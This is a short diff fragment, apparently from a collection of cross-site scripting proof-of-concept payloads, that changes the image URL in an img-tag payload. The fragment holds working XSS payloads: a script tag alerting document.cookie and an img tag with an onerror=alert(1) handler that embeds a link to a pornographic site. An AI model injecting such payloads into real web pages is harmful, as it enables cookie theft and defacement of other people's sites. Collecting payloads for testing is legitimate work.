@@ -46,7 +46,7 @@ nu11secur1ty<script>alert(document.cookie)</script>
 ```
 - 0.1
 ```
-</span><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif <a href=https://pornhub.com/> onerror=alert(1) /></span>
+</span><img src=https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/nu11secur1ty/images/chalga-tochilka.gif <a href=https://pornhub.com/> onerror=alert(1) /></span>
 ```
 
 - 0.4
